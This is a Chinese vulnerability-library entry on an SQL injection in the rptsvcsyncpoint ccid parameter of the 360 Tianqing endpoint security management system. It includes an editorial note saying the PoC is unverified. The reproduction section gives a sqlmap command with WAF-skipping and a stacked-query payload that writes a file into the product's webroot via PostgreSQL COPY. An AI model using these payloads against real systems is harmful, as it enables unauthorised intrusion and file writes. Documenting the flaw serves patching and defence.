---
source: "wy876 漏洞文库"
id: "vw-23223e5171f930314021f5b9"
entity_id: "ve-23223e5171f930314021f5b9"
schema_version: "1"
fofa_unverified: "app.name=="
title: "360天擎终端安全管理系统rptsvcsyncpoint存在SQL注入漏洞"
product: "奇安信360天擎管理服务"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "PostgreSQL高权限、Windows固定可写webroot，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/360/360%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frptsvcsyncpoint%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bmxoqmgt074w5sod"
source_status: "recorded"
---

# 360天擎终端安全管理系统rptsvcsyncpoint存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信360天擎管理服务
- 本文讨论：rptsvcsyncpoint ccid SQL注入
- 版本、权限与配置前提：PostgreSQL高权限、Windows固定可写webroot，版本未知
- 资料类型：SQL文件写入请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与617/618同原语同建表COPY链，只有文件名差异
- 无响应，任意文件写入需DB/OS权限前提；URL空格需编码
- IoT分类和Hunter元数据标签不当
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 权限/版本与文件验证待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎rptsvcsyncpoint存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征


# 四、漏洞复现
sqlmap

```plain
python3 sqlmap.py -u "https://xx.xx.xx.xx/api/dp/rptsvcsyncpoint?ccid=1" --batch --skip-waf
```


文件写入

```plain
/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('123456~');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\stc.txt';drop table O;--
```


写入文件位置

```plain
http://xx.xx.xx.xx/stc.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bmxoqmgt074w5sod>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
